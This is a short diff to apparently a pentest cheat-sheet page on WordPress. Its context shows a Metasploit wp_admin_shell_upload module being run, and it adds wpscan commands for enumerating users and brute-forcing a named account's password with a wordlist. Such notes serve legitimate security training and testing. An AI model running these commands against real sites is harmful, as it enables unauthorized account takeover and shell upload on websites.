@@ -36,6 +36,13 @@ msf exploit(wp_admin_shell_upload) > set targeturi /wordpress
 msf exploit(wp_admin_shell_upload) > exploit
 ```
 
+<pre class="language-bash"><code class="lang-bash"><strong>#User Enumeration
+</strong><strong>wpscan --url https://example/ --enumerate u
+</strong>
+#Bruteforce
+wpscan --url https://example/ --passwords wordlist.txt --usernames samson
+</code></pre>
+
 ### Additional References:
 
 [https://www.geeksforgeeks.org/wpscan-tool-in-kali-linux/](https://www.geeksforgeeks.org/wpscan-tool-in-kali-linux/)
